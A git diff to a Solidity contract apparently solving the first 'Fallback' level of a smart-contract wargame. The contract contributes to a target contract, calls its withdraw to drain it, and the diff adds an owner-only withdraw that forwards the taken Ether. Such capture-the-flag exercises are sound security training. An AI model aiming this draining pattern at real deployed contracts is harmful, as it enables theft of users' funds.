@@ -1,6 +1,8 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+import "@openzeppelin/contracts/access/Ownable.sol";
+
 interface FallbackI {
     function contribute() external payable;
 
@@ -9,8 +11,10 @@ interface FallbackI {
     function withdraw() external;
 }
 
-contract Level1Solution {
+contract Level1Solution is Ownable {
     address fallbackAddress;
+
+    event ReceivedAmount(uint256 amountReceived);
 
     constructor(address _address) payable {
         fallbackAddress = _address;
@@ -22,4 +26,15 @@ contract Level1Solution {
 
         FallbackI(_address).withdraw();
     }
+
+    function withdraw() public onlyOwner {
+        uint256 amount = address(this).balance;
+        (bool sent, ) = owner().call{value: amount}("");
+        require(sent, "Failed to send Ether");
+        emit ReceivedAmount(amount);
+    }
+
+    fallback() external {}
+
+    receive() external payable {}
 }
